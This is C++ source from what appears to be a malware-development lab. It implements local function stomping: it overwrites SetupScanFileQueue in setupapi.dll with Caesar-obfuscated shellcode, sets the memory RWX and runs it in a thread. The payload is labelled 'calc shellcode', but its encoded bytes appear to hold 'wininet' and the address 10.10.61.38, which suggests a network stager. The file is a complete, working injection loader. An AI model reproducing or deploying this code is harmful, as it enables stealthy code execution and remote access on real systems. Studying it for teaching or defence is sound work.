/*
* Lab 03 | Malware Dev Fall 2023
* Local Function Stomping
* coremed | willjcim
*/

#include <windows.h>
#include <iostream>


// set our target dll module and function to stomp
#define TARGET_DLL  "setupapi.dll"
#define TARGET_FUNC "SetupScanFileQueue"

// x64 calc shellcode
unsigned char shellcode[] = 
"\xff\x4b\x86\xe7\xf3\xeb\xcf\x03\x03\x03\x44\x54\x44\x53\x55\x4b\x34\xd5\x68\x4b\x8e"
"\x55\x63\x54\x59\x4b\x8e\x55\x1b\x4b\x8e\x55\x23\x4b\x12\xba\x4d\x4d\x50\x34\xcc"    
"\x4b\x8e\x75\x53\x4b\x34\xc3\xaf\x3f\x64\x7f\x05\x2f\x23\x44\xc4\xcc\x10\x44\x04"    
"\xc4\xe5\xf0\x55\x44\x54\x4b\x8e\x55\x23\x8e\x45\x3f\x4b\x04\xd3\x69\x84\x7b\x1b"    
"\x0e\x05\x12\x88\x75\x03\x03\x03\x8e\x83\x8b\x03\x03\x03\x4b\x88\xc3\x77\x6a\x4b"    
"\x04\xd3\x53\x8e\x4b\x1b\x47\x8e\x43\x23\x4c\x04\xd3\xe6\x59\x50\x34\xcc\x4b\x02"    
"\xcc\x44\x8e\x37\x8b\x4b\x04\xd9\x4b\x34\xc3\x44\xc4\xcc\x10\xaf\x44\x04\xc4\x3b"    
"\xe3\x78\xf4\x4f\x06\x4f\x27\x0b\x48\x3c\xd4\x78\xdb\x5b\x47\x8e\x43\x27\x4c\x04"    
"\xd3\x69\x44\x8e\x0f\x4b\x47\x8e\x43\x1f\x4c\x04\xd3\x44\x8e\x07\x8b\x44\x5b\x4b"    
"\x04\xd3\x44\x5b\x61\x5c\x5d\x44\x5b\x44\x5c\x44\x5d\x4b\x86\xef\x23\x44\x55\x02"
"\xe3\x5b\x44\x5c\x5d\x4b\x8e\x15\xec\x4e\x02\x02\x02\x60\x4b\x34\xde\x56\x4c\xc1"
"\x7a\x6c\x71\x6c\x71\x68\x77\x03\x44\x59\x4b\x8c\xe4\x4c\xca\xc5\x4f\x7a\x29\x0a"
"\x02\xd8\x56\x56\x4b\x8c\xe4\x56\x5d\x50\x34\xc3\x50\x34\xcc\x56\x56\x4c\xbd\x3d"
"\x59\x7c\xaa\x03\x03\x03\x03\x02\xd8\xeb\x0f\x03\x03\x03\x34\x33\x31\x34\x33\x31"
"\x39\x34\x31\x36\x3b\x03\x5d\x4b\x8c\xc4\x4c\xca\xc3\x12\x2a\x03\x03\x50\x34\xcc"
"\x56\x56\x6d\x06\x56\x4c\xbd\x5a\x8c\xa2\xc9\x03\x03\x03\x03\x02\xd8\xeb\x98\x03"
"\x03\x03\x32\x6e\x73\x55\x3c\x69\x66\x57\x72\x5d\x37\x54\x69\x3a\x55\x3a\x79\x68"
"\x79\x4c\x6a\x77\x44\x5c\x3a\x7d\x30\x6b\x72\x52\x5a\x5a\x76\x4d\x5c\x5c\x30\x74"
"\x6c\x45\x34\x4f\x33\x62\x78\x73\x33\x39\x48\x45\x64\x5d\x56\x70\x72\x4b\x30\x37"
"\x5c\x74\x58\x36\x5c\x39\x71\x3a\x46\x73\x51\x6a\x54\x3b\x77\x56\x4f\x3a\x7c\x64"
"\x4a\x35\x56\x55\x6a\x64\x54\x44\x67\x64\x67\x68\x66\x3c\x6c\x46\x5a\x35\x7b\x4e"
"\x6f\x36\x4a\x6e\x5c\x4b\x5a\x7a\x66\x59\x3a\x66\x44\x44\x47\x5b\x59\x76\x5d\x5b"
"\x6b\x6b\x7b\x36\x4d\x67\x7d\x51\x45\x52\x7a\x64\x52\x5a\x71\x7c\x4a\x5d\x4d\x3c"
"\x6c\x59\x70\x4b\x3a\x53\x6c\x71\x74\x4f\x03\x4b\x8c\xc4\x56\x5d\x44\x5b\x50\x34"
"\xcc\x56\x4b\xbb\x03\x05\x2b\x87\x03\x03\x03\x03\x53\x56\x56\x4c\xca\xc5\xee\x58"
"\x31\x3e\x02\xd8\x4b\x8c\xc9\x6d\x0d\x62\x56\x5d\x4b\x8c\xf4\x50\x34\xcc\x50\x34"
"\xcc\x56\x56\x4c\xca\xc5\x30\x09\x1b\x7e\x02\xd8\x88\xc3\x78\x22\x4b\xca\xc4\x8b"
"\x16\x03\x03\x4c\xbd\x47\xf3\x38\xe3\x03\x03\x03\x03\x02\xd8\x4b\x02\xd2\x77\x05"
"\xee\xcf\xeb\x58\x03\x03\x03\x56\x5c\x6d\x43\x5d\x4c\x8c\xd4\xc4\xe5\x13\x4c\xca"
"\xc3\x03\x13\x03\x03\x4c\xbd\x5b\xa7\x56\xe8\x03\x03\x03\x03\x02\xd8\x4b\x96\x56"
"\x56\x4b\x8c\xea\x4b\x8c\xf4\x4b\x8c\xdd\x4c\xca\xc3\x03\x23\x03\x03\x4c\x8c\xfc"
"\x4c\xbd\x15\x99\x8c\xe5\x03\x03\x03\x03\x02\xd8\x4b\x86\xc7\x23\x88\xc3\x77\xb5"
"\x69\x8e\x0a\x4b\x04\xc6\x88\xc3\x78\xd5\x5b\xc6\x5b\x6d\x03\x5c\x4c\xca\xc5\xf3"
"\xb8\xa5\x59\x02\xd8";

// caesar cipher function
void cc(unsigned char* shellcode, int shift, int size) {
	int i = 0;
	do {
		shellcode[i] = (int(shellcode[i]) - shift % 255);
		i++;
	} while (i < (size - 1));
}

BOOL StompFunction(PVOID pAddr, PBYTE pShellcode, SIZE_T sShellcodeSize) {
	// declare and init dwOldProtection variable
	DWORD dwOldProtection = NULL;

	// set target memory protection to RW
	if (!VirtualProtect(pAddr, sShellcodeSize, PAGE_READWRITE, &dwOldProtection)) {
		// if error return FALSE
		printf("VirtualProtect RW failed with error code: %d\n", GetLastError());
		return FALSE;
	}

	// decrypt 
	int shift = 3;
	cc(shellcode, shift, sizeof(shellcode));

	// copy our shellcode to target region
	RtlCopyMemory(pAddr, pShellcode, sShellcodeSize);

	// set target memory protection to RWX 
	if (!VirtualProtect(pAddr, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		// if error return FALSE
		printf("VirtualProtect RWX failed with error code: %d\n", GetLastError());
		return FALSE;
	}
	// function successfully stomped
	return TRUE;
}

int main() {
	// declare some variables
	PVOID   pAddr = NULL;
	HMODULE hModule = NULL;
	HANDLE  hThread = NULL;

	// prepare to load dll module
	printf("Load module %s?\n", TARGET_DLL);
	system("pause");

	// load dll module
	hModule = LoadLibraryA(TARGET_DLL);
	printf("Module %s loaded\n", TARGET_DLL);
	system("pause");

	// find function addr in memory
	pAddr = GetProcAddress(hModule, TARGET_FUNC);
	printf("Found function %s at 0x%llx\n", TARGET_FUNC, pAddr);
	printf("Stomp function?\n");
	system("pause");

	// stomp function
	if (!StompFunction(pAddr, shellcode, sizeof(shellcode))) {
		return -1;
	}

	printf("Function stomped!\n");
	printf("Execute shellcode?\n");
	system("pause");

	// execute our shellcode
	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)pAddr, 0, 0, 0);
	if (hThread != NULL) {
		WaitForSingleObject(hThread, INFINITE);
	}
	return 0;
}
